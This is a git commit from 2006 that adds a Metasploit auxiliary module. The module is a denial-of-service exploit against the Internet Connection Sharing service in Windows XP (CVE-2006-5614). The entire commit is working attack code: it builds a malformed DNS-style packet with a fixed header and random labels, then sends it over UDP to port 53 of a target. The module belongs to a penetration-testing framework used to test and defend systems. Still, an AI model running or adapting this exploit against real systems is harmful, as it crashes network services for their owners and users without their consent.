80164e2bf55e46d725f8a2639f8aea989c678742
Mario Ceballos <mc@metasploit.com>
2006-12-08 15:25:19 +0000

    added auxiliary module nat_helper.rb
    git-svn-id: file:///home/svn/framework3/trunk@4166 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/windows/nat/nat_helper.rb
@@ -0,0 +1,47 @@
+require 'msf/core'
+
+module Msf
+
+class Auxiliary::Dos::Windows::Nat::Nat_Helper < Msf::Auxiliary
+
+	include Exploit::Remote::Udp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Microsoft Windows NAT Helper Denial of Service',
+			'Description'    => %q{
+				This module exploits a denial of service vulnerability
+				within the Internet Connection Sharing service in 
+				Windows XP. 
+			},
+			'Author'         => [ 'MC' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 3983 $',
+			'References'     =>
+				[
+					[ 'BID', '20804' ],
+					[ 'CVE', '2006-5614' ],
+				],
+			'DisclosureDate' => 'Oct 26 2006'))
+			
+			register_options([Opt::RPORT(53),], self.class)
+	end
+
+	def run
+		connect_udp
+
+		pkt =  "\x6c\xb6\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		pkt << "\x03" + Rex::Text.rand_text_english(3) + "\x06"
+		pkt << Rex::Text.rand_text_english(10) + "\x03"
+		pkt << Rex::Text.rand_text_english(3) 
+		pkt << "\x00\x00\x01\x00\x01"
+	
+		print_status("Sending dos packet...")
+		
+		udp_sock.put(pkt)
+		
+		disconnect_udp
+	end
+
+end
+end	
